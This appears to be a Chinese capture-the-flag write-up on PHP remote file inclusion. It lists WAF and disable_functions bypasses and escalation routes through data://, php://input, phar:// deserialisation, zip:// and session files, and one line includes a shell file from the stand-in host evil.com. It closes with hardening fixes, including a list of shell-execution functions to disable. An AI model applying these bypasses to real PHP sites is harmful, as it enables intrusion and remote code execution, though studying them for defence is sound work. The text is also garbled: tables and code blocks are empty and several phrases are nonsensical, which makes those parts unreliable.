## 漏洞本质

RFI vs LFI 分水岭：

| 类型 | include 目标 | 关键开关 | 本题 |
|---|---|---|---|

[代码块边界]php

> Important
>

>

## 常见坑

| 问题 | 根因 | 解决 |
|---|---|---|
| `failed to open stream` | `allow_url_include=Off`，看上一条错日讲 | 换题目，或找 `phar://`、`zip://` 不依赖 URL 的伪协议 |
| `data://` 报错 | MIME 没写 / base64 缺 `=` / 特殊字符没转 | 全上 base64 版，完整保持尾 `=` |
| `php://input` 空输出 | 用了 GET，或 body 里缺 `<?php ?>` 标签 | 改 POST + body 具 `<?php … ?>` |
| URL 里 `+` 变空格 | URL 解码规则 | 换 `%2B`，或一律用 base64 |
| 响应 500，没输出 | `system()` 被 `disable_functions` | 换 `passthru` / `` ` ` `` / `shell_exec` |
| data 被 WAF 乔截 | 查性 data 字样 | `data://`，URL 编码整串 `%64%61%74%61://` |

## RFI 进阶谱

> Important

1. `data://` 直写（本题）：最轻，容易过历史 WAF
2. `php://input` + POST：最多得强财溢的字符不用担心
3. `phar://` + 上传：未过滤上传接口时，上传一个带元数据的 phar，`phar://upload/x.jpg/test` 触发 `__destruct` → 反序列化链
4. `zip://` / `ogg://`：`zip://upload/[敏感路径占位]#inner.php`——有上传就能用
5. SMB / UNC path：Windows + `allow_url_include` 下 `\\evil.com\share\shell.txt` 也能走
6. PHP session + `session.upload_progress`：上传进度可控内容写 sess 文件，再 LFI
7. 黑名单大小写绕：`DaTa://` / `Http://` 看 `stripos` 是否严格
8. URL 编码多重换：`%68%74%74%70://` 看后端是否重复解码

## 关键修复

> Important

修一（核心银弹）：`allow_url_include=Off` 不要开

[代码块边界]ini
; php.ini
allow_url_include = Off
allow_url_fopen   = Off    ; 也不需要就一关
[代码块边界]

- 对拼角：生产环境下几乎没有合法场景需要从 URL include
- 开了之后黑名单而不是从 include 参数层空白名单，是少服用近路数

修二：对 `include` 参数白名单

[代码块边界]php
$allow = ['home.php','about.php','contact.php'];
$url = basename($_GET['url'] ?? 'home.php');
if (!in_array($url, $allow, true)) exit('bad plugin');
include __DIR__.'/plugins/'.$url;
[代码块边界]

- `basename()` 替漫路径与伪协议前缀
- `in_array()` 严格符合

修三：`open_basedir` 关大门

[代码块边界]ini
open_basedir = /var/www/html/:/tmp/php_uploads/
[代码块边界]

- PHP 任何文件 / 流的打开都要在此范围里
- `data://` 的特殊性：是虚拟流，`open_basedir` 不拦 → 确保持 `allow_url_include=Off` 方为万全

修四：`disable_functions` 降低损失面

[代码块边界]ini
disable_functions = system,exec,passthru,shell_exec,popen,proc_open,assert
[代码块边界]

- RFI 即使进来，`system` 系已私也执行不了，越有效
